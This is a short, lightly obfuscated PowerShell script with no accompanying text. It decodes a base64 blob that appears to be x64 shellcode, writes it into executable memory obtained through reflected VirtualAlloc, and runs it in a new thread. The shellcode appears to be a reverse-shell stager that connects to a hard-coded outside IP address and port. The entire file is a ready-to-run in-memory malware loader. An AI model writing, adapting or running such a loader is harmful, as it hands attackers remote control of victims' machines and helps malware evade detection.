function tf3 {
	Param ($fV, $uxl)		
	$mVgj = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $mVgj.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($mVgj.GetMethod('GetModuleHandle')).Invoke($null, @($fV)))), $uxl))
}

function z59 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $i6d,
		[Parameter(Position = 1)] [Type] $mw = [Void]
	)
	
	$j8X = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$j8X.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $i6d).SetImplementationFlags('Runtime, Managed')
	$j8X.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $mw, $i6d).SetImplementationFlags('Runtime, Managed')
	
	return $j8X.CreateType()
}

[Byte[]]$oQ7 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFca6rO70FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$vH = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tf3 kernel32.dll VirtualAlloc), (z59 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $oQ7.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($oQ7, 0, $vH, $oQ7.length)

$qR3e = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tf3 kernel32.dll CreateThread), (z59 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vH,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tf3 kernel32.dll WaitForSingleObject), (z59 @([IntPtr], [Int32]))).Invoke($qR3e,0xffffffff) | Out-Null